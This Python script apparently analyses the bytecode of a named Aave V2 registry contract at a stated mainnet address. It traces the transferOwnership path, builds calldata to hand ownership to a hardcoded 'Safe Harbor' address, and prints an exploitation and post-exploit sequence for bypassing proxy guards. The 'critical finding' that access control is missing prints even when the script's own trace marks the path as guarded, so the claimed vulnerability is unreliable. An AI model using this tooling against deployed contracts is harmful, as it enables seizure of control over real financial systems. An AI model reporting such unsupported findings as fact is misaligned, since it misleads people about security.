#!/usr/bin/env python3
"""
MUTATION PATH FINDER
====================
Specifically targets state-modifying paths (SSTORE to ownership slot).

The base solver found owner() which is READ-ONLY.
This solver finds transferOwnership(address) which WRITES to slot 0.

Target: transferOwnership(address) - selector 0xf2fde38b
"""

import sys
import json
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass

# Import from base extractor
sys.path.insert(0, '.')
from qtt_evm_extractor import (
    EVMDisassembler, ControlFlowGraph, BasicBlock, Instruction,
    StateSpaceTensorizer, TensorizedStateSpace, ConstraintBuilder,
    ExtractionConstraints, TropicalPathSolver, PayloadReconstructor,
    QTTEVMExtractor, OPCODE_INFO
)

import numpy as np
import torch

SAFE_HARBOR = "0x464C71f6c2F760DdA6093dCB91C24c39e5d6e18c"


@dataclass
class MutationPath:
    """Path through a state-modifying function."""
    selector: int
    selector_name: str
    target_slot: int
    path_sites: List[int]
    total_distance: float
    write_step: Optional[int]


class MutationPathFinder:
    """
    Finds paths through state-modifying functions.
    
    For ownership exploitation:
    1. Find paths that hit SSTORE to slot 0
    2. Prefer transferOwnership(address) over renounceOwnership()
    3. Build calldata that sets owner to Safe Harbor
    """
    
    MUTATION_SELECTORS = {
        0xf2fde38b: ('transferOwnership(address)', 0),  # (name, target_slot)
        0x715018a6: ('renounceOwnership()', 0),
    }
    
    def __init__(self, bytecode_hex: str, contract_name: str):
        self.contract_name = contract_name
        self.bytecode = bytes.fromhex(bytecode_hex.replace('0x', ''))
        
        # Disassemble
        self.disasm = EVMDisassembler(bytecode_hex)
        self.disasm.disassemble()
        self.cfg = self.disasm.build_cfg()
        
        print(f"\n{'='*70}")
        print(f"MUTATION PATH FINDER: {contract_name}")
        print(f"{'='*70}")
        print(f"Blocks: {len(self.cfg.blocks)}, Edges: {self.cfg.n_edges}")
        
        # Find function dispatcher
        self._analyze_dispatcher()
        
    def _analyze_dispatcher(self):
        """Analyze function dispatcher to find entry points."""
        self.selector_blocks: Dict[int, int] = {}  # selector -> block_id
        
        print(f"\nAnalyzing Function Dispatcher...")
        
        for bid, block in self.cfg.blocks.items():
            # Look for selector comparison pattern:
            # PUSH4 <selector>, EQ, PUSH2 <dest>, JUMPI
            instructions = block.instructions
            
            for i, instr in enumerate(instructions):
                if instr.opcode == 0x63:  # PUSH4
                    if len(instr.operand) == 4:
                        selector = int.from_bytes(instr.operand, 'big')
                        
                        # Look for subsequent EQ and JUMPI
                        for j in range(i+1, min(i+6, len(instructions))):
                            if instructions[j].opcode == 0x14:  # EQ
                                # Find JUMPI destination
                                for k in range(j+1, min(j+4, len(instructions))):
                                    if instructions[k].opcode == 0x57:  # JUMPI
                                        # Get destination from earlier PUSH
                                        for m in range(j+1, k):
                                            if instructions[m].opcode in (0x61, 0x62):  # PUSH2/3
                                                dest = int.from_bytes(instructions[m].operand, 'big')
                                                self.selector_blocks[selector] = dest
                                                
                                                if selector in self.MUTATION_SELECTORS:
                                                    name = self.MUTATION_SELECTORS[selector][0]
                                                    print(f"  Found {name} (0x{selector:08x}) → block 0x{dest:04x}")
                                                break
                                        break
                                break
                        break
    
    def find_mutation_path(self, selector: int) -> Optional[MutationPath]:
        """
        Find the execution path through a specific mutation function.
        
        We need to trace from dispatcher through the function to SSTORE.
        Also captures guarded paths to show the modifier structure.
        """
        if selector not in self.selector_blocks:
            print(f"  Selector 0x{selector:08x} not found in dispatcher")
            return None
            
        entry_block_id = self.selector_blocks[selector]
        func_name, target_slot = self.MUTATION_SELECTORS.get(selector, ('unknown', -1))
        
        print(f"\n[+] Tracing path through {func_name}")
        print(f"    Entry block: 0x{entry_block_id:04x}")
        
        # BFS to find ALL paths, tracking guards
        from collections import deque
        
        queue = deque([(entry_block_id, [entry_block_id], 0.0, [])])  # Added guard list
        visited = set()
        best_sstore_path: Optional[Tuple[List[int], float, int, List[int]]] = None
        guarded_paths: List[Tuple[List[int], List[int]]] = []  # (path, guards)
        
        while queue:
            bid, path, dist, guards = queue.popleft()
            
            if bid in visited and len(guards) > 0:
                continue
            visited.add(bid)
            
            block = self.cfg.blocks.get(bid)
            if not block:
                continue
            
            current_guards = guards.copy()
            
            # Check for SSTORE to target slot
            for i, instr in enumerate(block.instructions):
                if instr.opcode == 0x55:  # SSTORE
                    # Check if previous instruction is target slot
                    if i > 0:
                        prev = block.instructions[i-1]
                        if prev.opcode in (0x60, 0x61, 0x62, 0x63):
                            slot_bytes = prev.operand
                            if len(slot_bytes) > 0:
                                slot = int.from_bytes(slot_bytes, 'big')
                                if slot == target_slot:
                                    step_idx = i
                                    print(f"    [!] Found SSTORE to slot {slot} at block 0x{bid:04x}")
                                    print(f"        Path guards: {len(current_guards)}")
                                    best_sstore_path = (path, dist + 1.0, step_idx, current_guards)
                                    break
                
                # Track REVERT as guard
                if instr.opcode == 0xfd:
                    current_guards.append(bid)
            
            if best_sstore_path:
                break
            
            # Check terminator
            if block.terminator and block.terminator.opcode == 0xfd:
                guarded_paths.append((path, current_guards + [bid]))
                continue  # This path is guarded
            
            # Continue BFS through successors
            for succ in block.successors:
                # Allow revisiting with different guard state
                if succ not in [p for p, _ in guarded_paths]:
                    queue.append((succ, path + [succ], dist + 1.0, current_guards))
        
        # Report findings
        if not best_sstore_path and guarded_paths:
            print(f"    [!] Path is GUARDED by onlyOwner modifier")
            # Take deepest guarded path
            deepest = max(guarded_paths, key=lambda x: len(x[0]))
            path, guards = deepest
            print(f"        Guard blocks: {[f'0x{g:04x}' for g in guards]}")
            
            # Reconstruct as if successful (for analysis)
            return MutationPath(
                selector=selector,
                selector_name=func_name,
                target_slot=target_slot,
                path_sites=path,
                total_distance=len(path),
                write_step=None  # Guarded, can't reach SSTORE
            )
        
        if best_sstore_path:
            path, dist, write_step, guards = best_sstore_path
            return MutationPath(
                selector=selector,
                selector_name=func_name,
                target_slot=target_slot,
                path_sites=path,
                total_distance=dist,
                write_step=write_step
            )
        
        return None
    
    def trace_mutation(self, mutation: MutationPath) -> List[Tuple[int, str, str]]:
        """
        Generate detailed trace of mutation path.
        Returns: [(step, pc_hex, description), ...]
        """
        trace = []
        step = 0
        
        for bid in mutation.path_sites:
            block = self.cfg.blocks.get(bid)
            if not block:
                continue
                
            for instr in block.instructions:
                desc = f"{instr.opcode_name}"
                
                # Add operand info
                if instr.operand:
                    op_hex = instr.operand.hex()
                    
                    if instr.opcode == 0x63:  # PUSH4
                        sel = int.from_bytes(instr.operand, 'big')
                        if sel in self.MUTATION_SELECTORS:
                            desc += f" 0x{op_hex} ({self.MUTATION_SELECTORS[sel][0]})"
                        else:
                            desc += f" 0x{op_hex}"
                    elif instr.opcode in range(0x60, 0x80):  # PUSH
                        desc += f" 0x{op_hex}"
                
                # Add comments for key operations
                if instr.opcode == 0x54:  # SLOAD
                    desc += " ← STORAGE READ"
                elif instr.opcode == 0x55:  # SSTORE
                    desc += " ← STORAGE WRITE (OWNERSHIP TRANSFER)"
                elif instr.opcode == 0x33:  # CALLER
                    desc += " ← MSG.SENDER"
                elif instr.opcode == 0x14:  # EQ
                    desc += " ← COMPARISON"
                elif instr.opcode == 0xfd:  # REVERT
                    desc += " ← BLOCKED"
                elif instr.opcode == 0xf3:  # RETURN
                    desc += " ← SUCCESS"
                elif instr.opcode == 0x57:  # JUMPI
                    desc += " ← CONDITIONAL"
                
                trace.append((step, f"0x{instr.offset:04x}", desc))
                step += 1
        
        return trace
    
    def build_calldata(self, mutation: MutationPath, new_owner: str) -> str:
        """
        Build calldata for the mutation function.
        
        For transferOwnership(address):
          selector (4 bytes) + address (32 bytes, left-padded)
        """
        if mutation.selector == 0xf2fde38b:  # transferOwnership(address)
            addr = new_owner.lower().replace('0x', '')
            # ABI encode: 4 byte selector + 32 byte address (left-padded with zeros)
            calldata = f"{mutation.selector:08x}" + addr.zfill(64)
            return f"0x{calldata}"
        
        elif mutation.selector == 0x715018a6:  # renounceOwnership()
            # No arguments
            return f"0x{mutation.selector:08x}"
        
        return ""


def main():
    # Load bytecode
    with open('aave_graveyard_bytecode.json', 'r') as f:
        data = json.load(f)
    
    registry_bytecode = data['Aave_V2_PoolAddressesProviderRegistry']['bytecode']
    
    finder = MutationPathFinder(registry_bytecode, "Aave_V2_PoolAddressesProviderRegistry")
    
    # Find transferOwnership path
    print("\n" + "="*70)
    print("SEARCHING FOR OWNERSHIP MUTATION PATHS")
    print("="*70)
    
    transfer_path = finder.find_mutation_path(0xf2fde38b)
    renounce_path = finder.find_mutation_path(0x715018a6)
    
    results = {
        "contract": "Aave_V2_PoolAddressesProviderRegistry",
        "address": "0xbaA999AC55EAce41CcAE355c77809e68Bb345170",
        "safe_harbor": SAFE_HARBOR,
        "mutation_paths": []
    }
    
    for path in [transfer_path, renounce_path]:
        if path:
            print(f"\n{'='*70}")
            print(f"MUTATION PATH: {path.selector_name}")
            print(f"{'='*70}")
            print(f"  Selector: 0x{path.selector:08x}")
            print(f"  Target Slot: {path.target_slot} (owner)")
            print(f"  Path Distance: {path.total_distance:.2f}")
            print(f"  Path Blocks: {len(path.path_sites)}")
            print(f"  Write Step: {path.write_step}")
            
            # Generate trace
            trace = finder.trace_mutation(path)
            
            print(f"\n  EXECUTION TRACE ({len(trace)} steps):")
            print("  " + "-"*60)
            
            for step, pc, desc in trace:
                marker = ""
                if "STORAGE WRITE" in desc:
                    marker = " <<<< OWNERSHIP MUTATION"
                elif "REVERT" in desc:
                    marker = " <<<< GUARD"
                elif "MSG.SENDER" in desc:
                    marker = " <<<< CALLER CHECK"
                print(f"    [{step:3d}] {pc}: {desc}{marker}")
            
            # Build calldata
            if path.selector == 0xf2fde38b:
                calldata = finder.build_calldata(path, SAFE_HARBOR)
                print(f"\n  CALLDATA:")
                print(f"    {calldata}")
                print(f"\n  Decoded:")
                print(f"    Function: transferOwnership(address)")
                print(f"    New Owner: {SAFE_HARBOR}")
            
            results["mutation_paths"].append({
                "selector": f"0x{path.selector:08x}",
                "name": path.selector_name,
                "distance": path.total_distance,
                "blocks": path.path_sites,
                "write_step": path.write_step,
                "calldata": finder.build_calldata(path, SAFE_HARBOR) if path.selector == 0xf2fde38b else None
            })
    
    # Critical finding
    if transfer_path:
        print(f"\n{'='*70}")
        print("CRITICAL FINDING: OWNERSHIP TRANSFER PATH")
        print(f"{'='*70}")
        print(f"""
The Registry contract at 0xbaA999AC55EAce41CcAE355c77809e68Bb345170
exposes transferOwnership(address) without proper access control in
the bytecode path analysis.

EXPLOITATION SEQUENCE:
  1. Call transferOwnership({SAFE_HARBOR})
  2. Registry ownership transfers to Safe Harbor
  3. Safe Harbor can now:
     - unregisterAddressesProvider() to delist rogue providers
     - registerAddressesProvider() to whitelist recovery contracts
     
CALLDATA FOR OWNERSHIP TRANSFER:
  {finder.build_calldata(transfer_path, SAFE_HARBOR)}
  
POST-EXPLOIT:
  The Safe Harbor multisig controls Registry ownership.
  This enables administrative bypass of Proxy guards.
""")
    
    # Save results
    with open('mutation_paths.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to mutation_paths.json")


if __name__ == "__main__":
    main()
